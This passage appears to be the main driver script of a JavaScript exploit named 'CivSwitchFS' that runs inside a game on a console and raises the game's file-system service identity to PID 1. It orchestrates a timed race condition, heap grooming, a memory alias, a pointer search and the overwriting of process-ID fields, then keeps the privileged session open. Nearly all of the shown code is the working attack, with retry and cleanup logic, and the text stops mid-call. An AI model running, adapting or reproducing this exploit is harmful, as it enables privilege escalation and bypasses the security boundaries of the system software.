/*
 * Promote the game's fsp-srv identity to PID 1, prove that User content storage
 * opens, and keep the promoted session reachable as `globalThis.fspSrv`.
 *
 * README.md covers usage. HOW_IT_WORKS.md walks the exploit itself.
 */

import coreRuntime, {waitMs} from "./core/runtime.mjs";
import {createFspIdentityConfig, VERBOSE_LOGGING} from "./core/config.mjs";
import {
    borrowRawThreadScheduling,
    openFspSessions,
    createScratchTree,
    openStorageAndClones,
    openTriggerHandles,
    allocatePacketBuffers,
    buildIpcRequests,
    checkPathPair,
    applyCmifContexts,
    prepareWaveInfrastructure
} from "./core/steps/setup.mjs";
import {runCanaryStage, WINDOW_RATE_THRESHOLD} from "./core/steps/canary.mjs";
import {
    preparePostCanaryCandidate,
    installCacheAlias,
    createAliasStatusMessage
} from "./core/steps/alias.mjs";
import {
    prepareReleaseNeighbors,
    captureReleaseBaseline,
    releaseNeighborsAndFindPointers,
    qualifyAddressPlan
} from "./core/steps/discovery.mjs";
import {
    retireCandidateCacheAndClose,
    cleanupScratchAndHandles,
    runHoleCleanupHandler,
    formatUnsafeState
} from "./core/steps/cleanup.mjs";
import {createFspIdentityHelpers} from "./core/helpers/index.mjs";
import {runPromotionStep} from "./core/steps/promotion.mjs";
import {
    formatAddressResults,
    formatAliasResult,
    formatAliasTiming,
    formatCanaryResult,
    formatCleanupResult,
    formatCode,
    formatFailureSuffix,
    formatPromotionResult,
    formatRetirementResult
} from "./core/log-format.mjs";
import {
    setVerboseLogging,
    isVerboseLogging,
    log,
    verboseLog
} from "./core/logger.mjs";
import {
    clearVisualLog,
    installRunInputControls,
    installLoaderLogPatch
} from "./core/visuals.mjs";

const {
    beginAllocationTracking,
    checkWindow,
    endAllocationTracking,
    extractRoleTimings,
    freeTrackedAllocations,
    readAllocationCounters,
} = coreRuntime;

const BASE_ATTEMPTS = 10;
const MAX_TOTAL_ATTEMPTS = BASE_ATTEMPTS + 1; // One extra slot for the allocation-order fallback test.
const RETRY_PAUSE_MS = 100;

// ----- Entry point -----

export async function run() {
    installLoaderLogPatch();
    const defaultTimingConfig = createFspIdentityConfig();
    const experimentMode = defaultTimingConfig.CANARY_BENCH_MODE === true;

    if (experimentMode) {
        await clearVisualLog();
    }

    const previousVerboseLogging = setVerboseLogging(VERBOSE_LOGGING || experimentMode);
    const runControl = {
        stopRequested: false,
        stopLogPromise: Promise.resolve(),
        verbosityLogPromise: Promise.resolve(),
        currentAttempt: 0
    };
    let inputControls = null;
    const runTotals = {
        positiveAttempts: 0,
        positiveWindows: 0,
        qualifiedCanaryFlips: 0
    };

    try {
        inputControls = installRunInputControls({
            onToggleVerbose() {
                const enabled = !isVerboseLogging();
                setVerboseLogging(enabled);
                let message;

                if (enabled) {
                    message = "Verbose logging enabled (controller Y switches to normal).";
                } else {
                    message = "Normal logging enabled.";
                }

                queueVerbosityMessage(runControl, message);
            },
            onStop() {
                if (runControl.stopRequested) {
                    return;
                }

                runControl.stopRequested = true;
                runControl.stopLogPromise = log("B/cancel pressed: stop requested. The current wave, if any, will finish; no further waves or attempts will launch.")
                    .catch(() => {});
            }
        });

        await log("==========================\n" +
            "CivSwitchFS (no RPC) by Nerisma\n" +
            "Thanks to Slapah, Pepsipu, Kurumuz and Alula\n" +
            "==========================");
        let loggingModeMessage;

        if (isVerboseLogging()) {
            loggingModeMessage = "Verbose logging is on (controller Y toggles the mode).";
        } else {
            loggingModeMessage = "Normal logging is on (controller Y enables verbose summaries).";
        }

        await log(loggingModeMessage);
        await runAttemptLoop({defaultTimingConfig, runControl, runTotals});
    } catch (error) {
        await log("Unexpected error. Checking cleanup status.");
        await verboseLog("Workflow error: " + String(error?.message || error));
    } finally {
        await waitMs(0);
        try {
            await runControl.verbosityLogPromise;

            if (runControl.stopRequested) {
                await runControl.stopLogPromise;
            }
        } finally {
            inputControls?.clearRunActions?.();
            inputControls?.dispose?.();
            setVerboseLogging(previousVerboseLogging);
            try {
                if (experimentMode) {
                    const finalSummary = formatCanaryFlipSummary(runTotals.qualifiedCanaryFlips,
                                                                 runTotals.positiveAttempts
                    );

                    if (finalSummary) {
                        await log(finalSummary);
                        await log("Log display done");
                    }
                }
            } catch (error) {
                try {
                    await log("Could not display the final summary: " +
                        String(error?.message || error));
                } catch {}
            }
        }
    }
}

// ----- Attempt retry loop -----

/** Run attempts until one succeeds, the state turns unsafe, the user stops the run, or the retry limit is reached. */
async function runAttemptLoop({defaultTimingConfig, runControl, runTotals}) {
    let attemptLimit = BASE_ATTEMPTS;
    let timingSchedule = cloneTimingSchedule(defaultTimingConfig);
    let usePreReservation = false;
    let preReservationFallbackUsed = false;

    await log("Using the built-in race timing schedule.");

    for (let attempt = 1; attempt <= attemptLimit; attempt++) {
        if (runControl.stopRequested) {
            return;
        }

        await log("======== ATTEMPT " + attempt + " ========");

        if (usePreReservation) {
            await log("Retrying with the reservation group opened before candidate storage.");
        }

        if (runControl.stopRequested) {
            return;
        }

        runControl.currentAttempt = attempt;
        const result = await runTrackedAttempt(usePreReservation,
                                               runControl, timingSchedule);
        accumulateRunTotals(runTotals, result);

        if (runControl.stopRequested || result.stoppedByUser) {
            await logSafeRestartStatus(result);
            return;
        }

        if (result.permissionProven) {
            if (result.promotionRestored && result.safeToRetry) {
                await log("Attempt complete.");
            }

            await logSafeRestartStatus(result);
            return;
        }

        if (!result.safeToRetry) {
            return;
        }

        const fallbackAvailable = canTestPreReservationFallback(attempt, result,
                                                                preReservationFallbackUsed);
        const anotherAttemptWillRun = attempt < attemptLimit || fallbackAvailable;

        if (result.nextTimingSchedule && anotherAttemptWillRun) {
            timingSchedule = cloneTimingSchedule(result.nextTimingSchedule);
            await log(formatTimingAdjustment(result.timingAdjustment));
        }

        if (fallbackAvailable) {
            preReservationFallbackUsed = true;
            usePreReservation = true;

            if (attempt === attemptLimit && attempt < MAX_TOTAL_ATTEMPTS) {
                attemptLimit = attempt + 1;
                await log("Adding one attempt to test the alternate candidate allocation order.");
            }

            await log("Cleanup was verified. The next attempt will open the reservation group before candidate storage.");
        } else if (result.retryWithPreReservation && !preReservationFallbackUsed) {
            await log("The hard attempt limit was reached; the alternate candidate allocation order was not tested.");
        } else if (usePreReservation && result.preReservationTested) {
            usePreReservation = false;
            await log("The reservation-first candidate attempt finished; later attempts will use the default order.");
        }

        if (attempt === attemptLimit) {
            await log(formatRetryLimitSummary(attempt, runTotals));
            await logSafeRestartStatus(result);
            return;
        }

        await waitMs(RETRY_PAUSE_MS);
    }
}

/** Copy both delay tables, so a retuned schedule can never write through to the config. */
function cloneTimingSchedule(schedule) {
    return {
        roleDelays: schedule.roleDelays.slice(),
        guardDelays: schedule.guardDelays.slice()
    };
}

/**
 * The reservation-first order earns one attempt past the base limit. The failed
 * attempt has to ask for it before that extra slot is spent.
 */
function canTestPreReservationFallback(attempt, result, preReservationFallbackUsed) {
    return Boolean(result.retryWithPreReservation &&
        !preReservationFallbackUsed &&
        attempt < MAX_TOTAL_ATTEMPTS);
}

function accumulateRunTotals(runTotals, result) {
    runTotals.positiveAttempts += result.positiveAttempts || 0;
    runTotals.positiveWindows += result.positiveWindows || 0;
    runTotals.qualifiedCanaryFlips += result.qualifiedCanaryFlips || 0;
}

function formatTimingAdjustment(change) {
    let sign = "";

    if (change.deltaUs > 0) {
        sign = "+";
    }

    return "Canary timing retuned for the next attempt: " + change.role + " " +
        sign + change.deltaUs.toFixed(0) + " µs (" + change.reason + ").";
}

// ----- Attempt execution -----

async function runTrackedAttempt(usePreReservation = false,
                                 runControl = null, timingSchedule = null) {
    const attemptState = createAttemptState(usePreReservation);

    const tracker = beginAllocationTracking();

    if (!tracker) {
        await log("Could not start an attempt. Stopping.");
        return attemptState;
    }

    let trackingEnded = false;
    let executionError = null;

    try {
        await runPayload(attemptState, runControl, timingSchedule);
    } catch (error) {
        let errorName = "";

        if (error?.name && error.name !== "Error") {
            errorName = error.name + ": ";
        }

        executionError = errorName + String(error?.message || error);
        await log("Attempt failed: " + executionError + "; checking cleanup.");
        await verboseLog("Attempt error: " + executionError);
    } finally {
        try {
            await beginCleanupLog(attemptState);
            await runHoleCleanupHandler(attemptState);
        } catch (error) {
            executionError = executionError ||
                "independent /hole cleanup threw: " +
                String(error?.message || error);
            await verboseLog("Cleanup error: " + executionError);
        } finally {
            trackingEnded = endAllocationTracking(tracker);
        }
    }

    const nativeMemory = releaseTrackedAttemptMemory(attemptState, tracker, trackingEnded);
    attemptState.safeToRetry = canSafelyRetryAttempt(attemptState, trackingEnded, nativeMemory);

    const attemptStatusMessage = createAttemptStatusMessage(attemptState, executionError, trackingEnded);

    if (attemptStatusMessage) {
        await log(attemptStatusMessage);
    }

    // A retained promotion keeps its endpoint active on purpose.
    if (!attemptState.promotionRetained &&
        attemptState.retainedEndpointActive &&
        !attemptState.cacheRetirementVerified) {
        await log(formatUnsafeState("Retained endpoint is active and cache retirement failed."));
    }

    if (executionError) {
        await verboseLog("Attempt ended after an error; retry checks are incomplete.");
    }

    const completedWithCleanSession = Boolean(!executionError &&
        attemptState.permissionProven &&
        attemptState.promotionRetained &&
        attemptState.lightCleanupVerified &&
        attemptState.holeCleanupVerified &&
        trackingEnded);

    if (completedWithCleanSession) {
        await clearVisualLog();
        await log("You just Civ Sevened your machine, congrats");
        await log("Cleanup verified: the god fsp-srv handle and its storage remain.");
    }

    return attemptState;
}

// ----- Single attempt pipeline -----

/**
 * Run one attempt in the only order that works: FSP resources and workers
 * first, then the canary window, the cache alias, the pointer search and the
 * address qualification, and last the PID 1 promotion.
 *
 * Every phase shares one `ctx`, which carries each handle and endpoint forward
 * and records how much cleanup the attempt already owes when a phase gives up.
 */
async function runPayload(attemptState, runControl = null,
                          timingSchedule = null) {
    const config = applyTimingSchedule(createFspIdentityConfig(), timingSchedule);
    const helpers = createFspIdentityHelpers({
        optimizeRootCandidateScan: true,
        collectRootScanTiming: true
    });

    if (typeof checkWindow !== "function" ||
        typeof extractRoleTimings !== "function") {
        await log("Timing support is unavailable. Stopping.");
        return;
    }

    const ctx = createAttemptContext({attemptState, config, helpers, runControl});
    const resources = await prepareFileSystemResources(ctx);

    if (!resources.ok) {
        return;
    }

    try {
        await runGuardedPhases(ctx);
    } finally {
        if (!ctx.cleanupAttempted) {
            await stopWithCleanup(ctx, {
                reason: "Workflow exited before its planned cleanup; attempting guarded cleanup.",
                workerStateSafe: ctx.workerStateSafe,
                domainSession: ctx.handles.domainSession || null
            });
        }
    }
}

/**
 * The phases that allocate workers and buffers. Each returns true to keep the
 * pipeline running, or false after cleaning up whatever it had already done.
 */
async function runGuardedPhases(ctx) {
    if (!await openStorageAndWorkers(ctx)) {
        return;
    }

    if (!await runCanaryPhase(ctx)) {
        return;
    }

    if (!await prepareCandidatePhase(ctx)) {
        return;
    }

    if (!await installAliasPhase(ctx)) {
        return;
    }

    if (!await runPointerSearchPhase(ctx)) {
        return;
    }

    if (!await qualifyAddressPhase(ctx)) {
        return;
    }

    if (!await promotePidOne(ctx)) {
        return;
    }

    await retireAndRunFinalCleanup(ctx);
}

// ----- Pipeline phases -----

/**
 * S1 to S3 plus the heap baseline: everything an attempt needs before any worker
 * exists. Most failures here return `{ok: false}` and let the caller finish the
 * attempt. The one path that opened a session without cleanup access closes the
 * handles it holds first.
 */
async function prepareFileSystemResources(ctx) {
    const {attemptState, config, helpers} = ctx;

    await log("Preparing file-system access and save data...");

    const schedulingResult = await borrowRawThreadScheduling();

    if (!schedulingResult?.ok) {
        await log("Could not prepare worker scheduling.");
        await verboseLog(formatFailureSuffix(schedulingResult));
        return {ok: false};
    }

    ctx.rawScheduling = schedulingResult.rawScheduling;

    const sessionSetup = await openFspSessions({helpers});

    if (!sessionSetup?.ok) {
        await log("Could not open the required file systems.");
        await verboseLog(formatFailureSuffix(sessionSetup));
        return {ok: false};
    }

    const sessionHandles = {...sessionSetup.handles,
        preserveTemporaryHandleForCleanup: true};

    Object.assign(ctx.handles, sessionHandles);
    ctx.pktBuf = sessionSetup.pktBuf;
    attemptState.holeCleanupHandle = ctx.handles.temporaryHandle || 0;

    if (!attemptState.holeCleanupHandle) {
        await log("Cleanup access is unavailable. Stopping safely.");
        await beginCleanupLog(attemptState);
        helpers.cleanup(ctx.handles);
        return {ok: false};
    }

    ctx.heapBaseline = readAllocationCounters(ctx.handles.rootSession, ctx.pktBuf);
    await logHeapBaseline(ctx.heapBaseline);

    const scratch = await createScratchTree({
        config, helpers,
        savedHandle: ctx.handles.savedHandle,
        temporaryHandle: ctx.handles.temporaryHandle,
        handleResources: ctx.handles
    });

    if (!scratch?.ok) {
        await log("Could not prepare temporary save data.");
        await verboseLog(formatFailureSuffix(scratch));
        return {ok: false};
    }

    ctx.scratch = scratch;
    return {ok: true};
}

/**
 * S4 to S10: storage handles, IPC packets and the wave infrastructure. This is
 * also the exploit's allocation order, so moving one call changes the heap shape
 * the race depends on.
 */
async function openStorageAndWorkers(ctx) {
    const {config, helpers, handles, scratch} = ctx;

    const storageSetup = await openStorageAndClones({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        handleResources: handles
    });

    if (!storageSetup?.ok) {
        ctx.cleanupAttempted = true;
        await log("Could not prepare storage access.");
        await verboseLog(formatFailureSuffix(storageSetup));
        return false;
    }

    Object.assign(handles, storageSetup);

    const triggerSetup = await openTriggerHandles({
        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        savedHandle: handles.savedHandle,
        temporaryHandle: handles.temporaryHandle,
        handleResources: handles
    });

    if (!triggerSetup?.ok) {
        ctx.cleanupAttempted = true;
        await log("Could not prepare file handles.");
        await verboseLog(formatFailureSuffix(triggerSetup));
        return false;
    }

    Object.assign(handles, triggerSetup);

    await log("File-system access and save data are ready.");
    await log("Preparing workers...");

    const buffers = allocatePacketBuffers({
        config, SCRATCH_DIR: scratch.SCRATCH_DIR,
        canaryPath: scratch.canaryPath
    });

    if (!buffers?.ok) {
        await log("Could not prepare worker buffers.");
        return false;
    }

    ctx.buffers = buffers;
    ctx.renamePathBuffers = {
        fillerSource: {address: buffers.fillerBuf0, size: 16,
            expected: buffers.fillerSrc},
        fillerDestination: {address: buffers.fillerBuf1, size: 0x7F0,
            expected: buffers.fillerDst},
        guardSource: {address: buffers.guardBuf0, size: 0x301,
            expected: buffers.guardPath},
        guardDestination: {address: buffers.guardBuf1, size: 0x301,
            expected: buffers.guardPathC}
    };

    const packets = buildIpcRequests({
        config,
        canaryBufMem: buffers.canaryBufMem,
        canaryPath: scratch.canaryPath,
        fillerBuf0: buffers.fillerBuf0,
        fillerBuf1: buffers.fillerBuf1,
        fragmentBufs: buffers.fragmentBufs,
        guardBuf0: buffers.guardBuf0,
        guardBuf1: buffers.guardBuf1,
        triggerBuf: buffers.triggerBuf
    });

    if (!packets?.ok) {
        await log("Could not prepare worker requests.");
        return false;
    }

    ctx.packets = packets;

    const pathPair = await checkPathPair({
        config, helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
        fillerDst: buffers.fillerDst, fillerSrc: buffers.fillerSrc,
        guardPath: buffers.guardPath, guardPathC: buffers.guardPathC,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        handleResources: handles
    });

    if (!pathPair?.ok) {
        ctx.cleanupAttempted = true;
        await log("Could not prepare auxiliary storage.");
        await verboseLog(formatFailureSuffix(pathPair));
        return false;
    }

    Object.assign(handles, pathPair);

    const cmifSetup = applyCmifContexts({
        REQ: packets.REQ, clearPkt: packets.clearPkt,
        pinPkt: packets.pinPkt, prePkt: packets.prePkt
    });

    if (!cmifSetup?.ok) {
        await log("Could not prepare worker requests.");
        return false;
    }

    const waveInfrastructure = await prepareWaveInfrastructure({
        config, helpers, REQ: packets.REQ,
        clearPkt: packets.clearPkt, pinPkt: packets.pinPkt,
        prePkt: packets.prePkt, rootClones: handles.rootClones,
        saveClones: handles.saveClones,
        rootSession: handles.rootSession,
        storageHandle: handles.storageHandle,
        triggerBuf: buffers.triggerBuf,
        triggerHandle: handles.triggerHandle
    });

    if (!waveInfrastructure?.ok) {
        await log("Could not start the workers.");
        return false;
    }

    ctx.waves = waveInfrastructure;
    await log("Workers are ready.");
    return true;
}

/** S11: launch canary waves until the window qualifies, the user stops the run, or the wave budget runs out. */
async function runCanaryPhase(ctx) {
    const {attemptState, config, helpers, handles} = ctx;

    await log("Checking the canary window...");
    ctx.workerStateSafe = false;

    const canary = await runCanaryStage({
        config, helpers,
        resources: {
            buffers: ctx.buffers, handles, packets: ctx.packets,
            pktBuf: ctx.pktBuf, rawScheduling: ctx.rawScheduling,
            renamePathBuffers: ctx.renamePathBuffers,
            scratch: ctx.scratch, waveInfrastructure: ctx.waves
        },
        shouldStop: () => ctx.runControl?.stopRequested === true,
        attemptNumber: ctx.runControl?.currentAttempt
    });

    ctx.canary = canary;
    ctx.workerStateSafe = canary.workerStateSafe;
    applyCanaryAttemptState(attemptState, canary);

    await log(canary.message);
    await verboseLog(formatCanaryResult(canary.control, config));
    handles.pinHandle = canary.pinHandle;

    if (canary.benchMessage) {
        await log(canary.benchMessage);
    }

    if (!canary.stopReason) {
        return true;
    }

    await stopWithCleanup(ctx, {
        reason: canary.stopReason,
        workerStateSafe: canary.workerStateSafe
    });
    return false;
}

/** S13: open the candidate storage and read it back before a single copy wave runs. */
async function prepareCandidatePhase(ctx) {
    const {attemptState, config, handles} = ctx;
    const control = ctx.canary.control;

    await log("Preparing candidate storage...");

    const candidate = await preparePostCanaryCandidate({
        config, helpers: ctx.helpers,
        canaryQualified: control.canaryQualified,
        pktBuf: ctx.pktBuf,
        rootSession: handles.rootSession,
        storageHandle: handles.storageHandle,
        workerStateSafe: control.workerStateSafe,
        usePreReservation: attemptState.usePreReservation
    });

    ctx.candidate = candidate;
    attemptState.preReservationTested =
        attemptState.usePreReservation === true;

    await log(createCandidateStorageMessage(candidate));
    await verboseLog("Candidate storage: " +
        (candidate?.failureReason || "verified"));

    handles.candidateHandle = candidate?.candidateHandle || 0;

    if (!isCandidateStorageSetupUnqualified(candidate)) {
        return true;
    }

    await stopWithCleanup(ctx, {
        reason: "Candidate storage is not fully qualified; skipping cache alias and later phases.",
        workerStateSafe: control.workerStateSafe
    });
    return false;
}

/** S14: copy the candidate into the cache alias, then read back through the alias to prove it holds. */
async function installAliasPhase(ctx) {
    const {attemptState, helpers} = ctx;
    const control = ctx.canary.control;

    await logHeapStateBeforeAlias(ctx);
    await log("Installing the memory alias...");

    const aliasStartedAt = Date.now();

    ctx.workerStateSafe = false;
    attemptState.candidateCacheRetirementRequired = true;
    attemptState.cacheRetirementVerified = false;

    /*
     * Build the copy bag before the alias step, which reads its packet and wave
     * resources from it. Once the waves have run, the copy results are stamped
     * back into that same bag.
     */
    ctx.addressCopy = buildAddressCopy(ctx);

    const alias = await installCacheAlias({
        config: ctx.config, helpers, copy: ctx.addressCopy,
        canaryState: {
            wavesJoined: control.wavesJoined,
            wavesStarted: control.wavesStarted,
            workerStateSafe: control.workerStateSafe
        },
        canaryQualified: ctx.candidate.canaryQualified,
        candidateHandle: ctx.candidate.candidateHandle,
        preGroup: ctx.candidate.preGroup,
        primeHex: ctx.candidate.primeHex,
        renamePathBuffers: ctx.renamePathBuffers,
        reportProgress: log,
        shouldStop: () => ctx.runControl?.stopRequested === true
    });

    const aliasElapsedMs = Date.now() - aliasStartedAt;

    ctx.alias = alias;
    ctx.workerStateSafe = alias?.workerStateSafe === true;
    stampAliasResults(ctx.addressCopy, alias);

    await log(createAliasStatusMessage(alias));
    await verboseLog(formatAliasResult(alias) +
        formatAliasTiming(aliasElapsedMs));

    if (alias?.stoppedByUser || ctx.runControl?.stopRequested) {
        attemptState.stoppedByUser = true;
        await stopWithCleanup(ctx, {
            reason: "Stopped by user during memory alias after the current wave; remaining copy steps were skipped.",
            candidateCacheNeedsRetirement:
                Boolean(alias?.candidateCacheNeedsRetirement),
            workerStateSafe: alias?.workerStateSafe === true
        });
        return false;
    }

    if (!await confirmAliasReadback(ctx, alias)) {
        return false;
    }

    if (!alias?.ok || !alias.aliasInstalled) {
        await stopWithCleanup(ctx, {
            reason: "Cache alias installation was incomplete; skipping memory search and address qualification.",
            candidateCacheNeedsRetirement:
                Boolean(alias?.candidateCacheNeedsRetirement),
            workerStateSafe: alias?.workerStateSafe === true
        });
        return false;
    }

    return true;
}

/** S15 to S17: open the release neighbors, snapshot the heap, then look for the pointer changes. */
async function runPointerSearchPhase(ctx) {
    const {config, helpers, handles} = ctx;

    await log("Preparing memory search...");

    const releaseSetup = await prepareReleaseNeighbors({
        aliasInstalled: ctx.alias.aliasInstalled,
        candidateHandle: handles.candidateHandle,
        config, copyStepsCompleted: ctx.alias.copyStepsCompleted,
        rootSession: handles.rootSession
    });

    if (!releaseSetup?.ok) {
        await log("Could not prepare memory search.");
        await stopWithCleanup(ctx, {
            reason: "Neighbor storage setup failed; skipping heap and address scans.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.alias.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy.workerStateSafe
        });
        return false;
    }

    handles.extraStorages = releaseSetup.extraStorages || [];

    if (!releaseSetup.eligible) {
        await log("Memory search is unavailable.");
        await stopWithCleanup(ctx, {
            reason: "Neighbor scan is ineligible; skipping heap snapshot, pointer search, address qualification and promotion.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.alias.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy.workerStateSafe
        });
        return false;
    }

    await log("Memory search is ready.");
    await verboseLog(formatReleaseSetupDetails(releaseSetup));
    await log("Capturing a memory snapshot...");

    const baseline = await captureReleaseBaseline({
        config, candidateHandle: handles.candidateHandle,
        primeHex: ctx.candidate.primeHex, helpers
    });

    if (!baseline?.snapshotOk) {
        await log("Memory snapshot could not be verified.");
        await verboseLog(formatBaselineFailureDetails(baseline));

        if (!ctx.attemptState.usePreReservation) {
            ctx.attemptState.retryWithPreReservation = true;
        }

        await stopWithCleanup(ctx, {
            reason: "The memory snapshot did not pass its readback checks; skipping the memory scan.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.alias.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy.workerStateSafe
        });
        return false;
    }

    await log("Memory snapshot captured.");
    await log("Searching memory for candidates...");

    const release = await releaseNeighborsAndFindPointers({
        config, candidateHandle: handles.candidateHandle,
        primeHex: ctx.candidate.primeHex,
        extraStorages: releaseSetup.extraStorages,
        baseline, helpers
    });

    handles.extraStorages = release?.extraStorages ||
        releaseSetup.extraStorages || [];

    await logPointerSearchVerdict(release);

    if (!release?.ok) {
        await stopWithCleanup(ctx, {
            reason: "Pointer scan failed; skipping address qualification and promotion.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.alias.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy.workerStateSafe
        });
        return false;
    }

    if (!release.pointerCandidates?.length) {
        await stopWithCleanup(ctx, {
            reason: "No qualified pointer candidates; skipping address qualification and promotion.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.alias.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy.workerStateSafe
        });
        return false;
    }

    ctx.release = release;
    return true;
}

/** S18 and S19: qualify the address plan, then prove the root identity by reading it back. */
async function qualifyAddressPhase(ctx) {
    const {config, helpers, handles} = ctx;

    await log("Verifying the memory address...");

    const addressStartedAt = Date.now();

    ctx.workerStateSafe = false;

    const address = await qualifyAddressPlan({
        config, helpers, addressCopy: ctx.addressCopy,
        aliasInstalled: ctx.alias.aliasInstalled,
        candidateHandle: handles.candidateHandle,
        collectTimingProfile: true,
        reportProgress: reportAddressProgress,
        shouldStop: () => ctx.runControl?.stopRequested === true,
        pointerCandidates: ctx.release.pointerCandidates,
        primeHex: ctx.candidate.primeHex,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle
    });

    const addressElapsedMs = Date.now() - addressStartedAt;
    const readyForPromotion = hasVerifiedAddressPlan(address);

    ctx.address = address;
    ctx.workerStateSafe = address?.addressCopy?.workerStateSafe === true;

    if (readyForPromotion) {
        await log("MEMORY ADDRESS VERIFIED");
    } else {
        await log(createAddressFailureMessage(address));
    }

    for (const message of formatAddressResults(address, addressElapsedMs)) {
        await verboseLog(message);
    }

    handles.domainSession = address.domainSession;
    ctx.addressCopy = address?.addressCopy || ctx.addressCopy;

    if (ctx.runControl?.stopRequested) {
        ctx.attemptState.stoppedByUser = true;
        await stopWithCleanup(ctx, {
            reason: "Stopped by user during address qualification after the current wave; remaining scans were skipped.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.addressCopy?.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy?.workerStateSafe === true,
            domainSession: address.domainSession
        });
        return false;
    }

    if (!readyForPromotion) {
        await stopWithCleanup(ctx, {
            reason: "Address or root identity was not fully verified; PID promotion was skipped.",
            candidateCacheNeedsRetirement:
                Boolean(ctx.addressCopy?.candidateCacheNeedsRetirement),
            workerStateSafe: ctx.addressCopy?.workerStateSafe === true,
            domainSession: address.domainSession
        });
        return false;
    }

    return true;
}

/**
 * S20: write the PID fields and prove User storage access. A retained promotion
 * keeps its endpoint open, so this phase takes the light cleanup path and skips
 * the full retirement.
 */
async function promotePidOne(ctx) {
    const {attemptState, config, helpers, handles} = ctx;
    const address = ctx.address;

    await log("Checking access to user storage...");
    ctx.workerStateSafe = false;

    const promotion = await runPromotionStep({
        config, addressPlan: address.addressPlan,
        addressCopy: address.addressCopy,
        addressReadVerified: address.addressReadVerified,
        candidateHandle: handles.candidateHandle,
        domainSession: handles.domainSession,
        helpers, rootStageVerified: address.rootStageVerified,
        verifiedIdentityTargets: address.verifiedIdentityTargets,
        workerStateSafe: address.addressCopy.workerStateSafe
    });

    const outcome = promotion?.promotionOutcome || {};

    ctx.promotion = promotion;
    ctx.workerStateSafe = promotion?.workerStateSafe === true;
    ctx.addressCopy = promotion?.addressCopy || address.addressCopy;
    recordPromotionOutcome(attemptState, promotion);

    await log(createPermissionMessage(attemptState.permissionProven));
    await verboseLog(formatPromotionResult(promotion, address, handles));

    if (!outcome.promotionRetained) {
        return true;
    }

    await beginCleanupLog(attemptState);
    ctx.cleanupAttempted = true;

    const lightCleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: ctx.scratch.SCRATCH_DIR,
        auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
        candidateCacheNeedsRetirement: false,
        candidateCacheRetired: false,
        retainedEndpointActive: true,
        domainSession: handles.domainSession,
        keepDomainSessionOpen: true,
        extentTriggerHandle: handles.extentTriggerHandle,
        extraStorages: handles.extraStorages,
        pinHandle: handles.pinHandle,
        rootClones: handles.rootClones,
        rootSession: handles.rootSession,
        saveClones: handles.saveClones,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle,
        temporaryHandle: 0,
        triggerHandle: handles.triggerHandle,
        workerStateSafe: promotion.workerStateSafe,
        dirtyFileSize: config.DIRTY_FILE_SIZE,
        dirtyFilePath: ctx.scratch.dirtyFilePath
    });

    attemptState.promotionRetained = true;
    attemptState.retainedEndpointActive = true;
    attemptState.workersQuiesced = promotion.workerStateSafe === true;
    attemptState.lightCleanupVerified = Boolean(lightCleanup.cleanupVerified &&
        outcome.contentFsHandleClosed !== false &&
        outcome.contentFsDomainObjectClosed !== false);
    attemptState.workerStateSafe = lightCleanup.workerStateSafe;
    attemptState.primaryCleanupAttempted = lightCleanup.attempted === true;
    attemptState.primaryCommitVerified =
        lightCleanup.commitTransport === 0 && lightCleanup.commitResult === 0;
    attemptState.primaryScratchCleanupVerified =
        lightCleanup.attempted === true &&
        lightCleanup.deleteTransport === 0 && lightCleanup.deleteResult === 0 &&
        lightCleanup.commitTransport === 0 && lightCleanup.commitResult === 0;
    attemptState.primaryHandlesClosed = Boolean(lightCleanup.attempted === true &&
        lightCleanup.handlesClosed === lightCleanup.expectedHandles &&
        (lightCleanup.closeErrors || []).length === 0);

    ctx.workerStateSafe = lightCleanup.workerStateSafe;

    await verboseLog(formatCleanupResult(lightCleanup,
                                         lightCleanup.workerStateSafe));
    return false;
}

/** S21 and S22: retire the candidate cache, close every remaining handle, and record the final verdict. */
async function retireAndRunFinalCleanup(ctx) {
    const {attemptState, config, handles, helpers} = ctx;
    const promotion = ctx.promotion;

    await beginCleanupLog(attemptState);

    ctx.workerStateSafe = false;
    attemptState.workersQuiesced = false;

    const retired = await retireCandidateCacheAndClose({
        helpers, addressCopy: ctx.addressCopy,
        candidateCacheNeedsRetirement:
            Boolean(attemptState.candidateCacheRetirementRequired ||
            ctx.addressCopy.candidateCacheNeedsRetirement),
        candidateHandle: handles.candidateHandle,
        rootSession: handles.rootSession,
        retireRetainedEndpoint: promotion.retireRetainedEndpoint,
        workerStateSafe: promotion.workerStateSafe
    });

    attemptState.workersQuiesced = retired?.workersQuiesced === true;
    attemptState.retainedEndpointActive =
        Boolean(retired?.addressCopy?.retainedEndpointActive);

    ctx.workerStateSafe = retired?.workerStateSafe === true;
    ctx.addressCopy = retired?.addressCopy || ctx.addressCopy;

    await verboseLog(formatRetirementResult(retired));
    handles.candidateHandle = retired.candidateHandle;
    ctx.cleanupAttempted = true;

    const cleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: ctx.scratch.SCRATCH_DIR,
        auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
        candidateCacheNeedsRetirement:
            Boolean(attemptState.candidateCacheRetirementRequired ||
            retired.addressCopy.candidateCacheNeedsRetirement),
        candidateCacheRetired: retired.candidateCacheRetired,
        retainedEndpointActive: retired.addressCopy.retainedEndpointActive,
        domainSession: handles.domainSession,
        extentTriggerHandle: handles.extentTriggerHandle,
        extraStorages: handles.extraStorages,
        pinHandle: handles.pinHandle,
